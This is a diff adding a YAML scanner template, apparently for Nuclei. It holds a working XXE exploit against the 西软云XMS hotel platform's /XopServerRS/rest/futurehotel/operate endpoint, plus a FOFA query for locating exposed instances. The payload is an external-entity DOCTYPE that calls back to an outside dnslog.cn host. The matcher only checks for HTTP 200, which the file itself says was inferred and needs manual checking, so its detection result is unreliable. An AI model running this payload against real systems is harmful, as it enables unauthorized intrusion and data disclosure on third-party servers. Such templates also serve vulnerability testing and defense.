@@ -1,0 +1,36 @@
+id: poc-20c96747882f92d6649a
+info:
+  name: 西软云XMSoperate接口存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/20c96747882f92d6649a670997e57b99
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: xxe,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 20c96747882f92d6649a670997e57b99
+    fofa: + fofa`app="shiji-西软云XMS"`
+http:
+- raw:
+  - 'POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3157.54 Safari/537.36
+
+    Content-Length: 79
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: text/xml
+
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://q26gls.dnslog.cn"> %remote;]>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
